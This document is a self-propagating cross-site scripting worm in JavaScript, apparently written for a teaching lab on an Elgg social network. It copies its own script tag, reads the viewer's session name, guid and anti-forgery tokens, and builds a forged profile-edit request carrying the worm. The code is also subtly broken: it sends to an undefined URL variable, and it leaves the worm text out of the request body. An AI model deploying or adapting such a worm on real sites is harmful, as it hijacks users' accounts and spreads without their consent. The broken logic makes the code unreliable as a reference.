<script type="text/javascript" id="worm" >
    window.onload = function () {
    var headerTag = "<script id=\"worm\" type=\"text/javascript\">";  // (1)
    var jsCode = document.getElementById("worm").innerHTML;           // (2)
    var tailTag = "</" + "script > ";                                   // (3)
var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);  // (4)
var uName = elgg.session.user.name;
var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
var guid = "&guid=" + elgg.session.user.guid;
var about = "&description = Samy was here" + wormCode + " &accesslevel[description]=2";
var inName = "&name=" + uName;
var editURL = "http://www.labelgg.com/profile/" + uName + "/edit";
var addContent = token + ts + inName + guid;

if (elgg.session.user.guid != 59) {
    alert("Attack on: " + uName)
    Ajax = new XMLHttpRequest();
    Ajax.open("POST", addURL, true);
    Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    Ajax.send(addContent);
}
}
</script >
